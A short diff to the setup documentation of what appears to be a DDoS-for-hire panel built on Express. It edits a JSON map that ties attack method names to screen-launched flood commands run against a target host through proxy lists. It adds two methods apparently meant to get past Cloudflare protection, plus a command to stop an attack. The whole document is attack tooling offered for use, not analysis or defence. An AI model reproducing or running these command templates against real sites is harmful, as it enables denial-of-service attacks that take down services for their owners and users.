@@ -35,8 +35,10 @@ npm i express
 
 ```json
 {
-    "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
-    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
+    "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxy.txt ${time}",
+    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxy.txt ${time}",
+    "CFS": "screen -dmS attack_${attack_id} node CFS.js ${host} ${time} ${thread} ${method} proxy.txt ${rq}",
+    "CF-TLS": "screen -dmS attack_${attack_id} node CF-TLS.js ${host} ${time} ${thread} proxy.txt",
     "STOP": "screen -dm pkill -f ${host}"
 }
 ```
